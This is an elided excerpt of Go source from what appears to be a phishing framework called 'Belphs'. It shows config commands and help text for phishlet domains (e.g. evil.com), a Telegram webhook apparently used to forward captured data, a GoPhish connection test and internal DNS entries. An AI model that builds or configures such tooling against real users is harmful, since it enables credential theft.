...
func (t *Terminal) handleConfig(args []string) error {
	...
	if pn == 0 {
		...
		case "webhook_telegram":
			...
			log.Warning("Restart to save webhook")
			return nil
		...
		case "gophish":
			...
			case "test":
				...
				if err != nil {
					log.Error("Belphs: %s", err)
				} else {
					log.Success("Belphs: connection was successful go and try it brother !")
				}
				return nil
			}
		}
...
func (t *Terminal) createHelp() {
	h, _ := NewHelp()
	h.AddCommand("config", "general", "manage general configuration", "Shows values of all Belphs configuration variables and allows to change them.", LAYER_TOP,
	...
	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evil.com)")
	...
	h.AddSubCommand("config", []string{"webhook_telegram"}, "webhook_telegram <bot_token>/<chat_id>", "format: bot_token/chat_id (example: 9165432191:ABBJvavhVAcaqTCXAvh4wGCgg6WtnhebddsVaa/-17751242916)")
	...
	h.AddSubCommand("config", []string{"dnsentry"}, "Belphs Premium dnsentry <name> <record_type> <value>", "provide a DNS entry of type A or CNAME to be returned by the internal resolver e.g. 'www CNAME cloudfront.net.'")
